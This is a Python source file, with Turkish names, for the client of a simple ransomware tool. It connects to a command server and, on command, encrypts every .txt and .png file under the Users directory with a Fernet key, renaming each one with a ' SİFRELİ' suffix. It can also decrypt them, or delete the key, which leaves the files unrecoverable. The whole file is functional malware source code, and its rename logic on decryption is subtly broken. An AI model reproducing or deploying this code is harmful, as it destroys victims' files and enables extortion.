import socket as s
from cryptography.fernet import Fernet
import os
import time


class Client:
    host = "127.0.0.1"
    port = 64325
    client = s.socket(s.AF_INET,s.SOCK_STREAM)

    def __init__(self):
        self.client.connect((self.host,self.port))
        print("Servara bağlantı başarılı")
       

    def msj_set(self,msj):
        msj = str(msj)
        self.client.send(msj.encode())


    def msj_get(self):
        gelen_mesaj = self.client.recv(1024).decode()
        return gelen_mesaj
    

  
    def sifrele(self,dosya):
        if os.path.exists("key.key") == False:
            with open("key.key","wb") as file:
                key = Fernet.generate_key()
                file.write(key)
        elif os.path.exists("key.key") == True:
            with open("key.key","rb") as file:
                key = file.read()

        with open(dosya,"rb") as file:
            dosya_oku = file.read()

        if len(dosya_oku) > 0:
            yeni_isim = f"{dosya} SİFRELİ"
            anahtar = Fernet(key)
            try:
                dosya_sifrele = anahtar.encrypt(dosya_oku)
            except Exception:
                print("Hata !!!")
            else:
                with open(dosya,"wb") as file:
                    file.write(dosya_sifrele)
                os.rename(dosya,yeni_isim)        
                                  


    def coz(self,dosya):
        with open("key.key","rb") as file:
            key = file.read()

        with open(dosya,"rb") as file:
            dosya_oku = file.read()

        if len(dosya_oku) > 0:
            eski_isim = dosya.rstrip(" SİFRELİ")
            anahtar = Fernet(key)
            try:
                dosya_coz = anahtar.decrypt(dosya_oku)
            except:
                pass             
            else:
                with open(dosya,"wb") as file:
                    file.write(dosya_coz)
                os.rename(dosya,eski_isim)   

                         


    def konturol(self):
        while True:
            gelen_istem = self.msj_get()
            if gelen_istem == "kapat":
                os.remove("key.key") 
                break
            elif gelen_istem == "sifrele":
                uzantılar = [".txt",".png"]
                for dizin,liste,dosyalar in os.walk("\\Users"):
                    for dosya in dosyalar:
                        isim,uzantı = os.path.splitext(dosya)
                        uzantı = uzantı.lower()
                        if uzantı in uzantılar:
                            dosyaAdi = f"{dizin}\\{dosya}"
                            self.sifrele(dosyaAdi)
            elif gelen_istem == "coz":
                for dizin,liste,dosyalar in os.walk("\\Users"):
                    for dosya in dosyalar:
                        kes = dosya.split(" ")
                        if kes[-1] == "SİFRELİ":
                            dosyaAdi = f"{dizin}\\{dosya}"
                            self.coz(dosyaAdi)
                                   



if __name__ == "__main__":
    a = Client()
    a.konturol()

   



        